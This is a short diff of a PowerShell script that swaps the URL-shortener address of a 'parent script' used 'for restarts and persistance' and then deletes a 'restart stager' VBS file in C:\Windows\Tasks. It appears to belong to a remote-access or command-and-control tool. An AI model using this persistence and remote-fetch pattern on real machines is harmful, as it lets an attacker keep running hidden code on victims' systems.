@@ -40,7 +40,7 @@ if ($auto -eq 'n') {
     $defaultstart = 0 
 }
 
-$global:parent = "is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+$global:parent = "is.gd/fPSP3B" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if (Test-Path "C:\Windows\Tasks\service.vbs") {
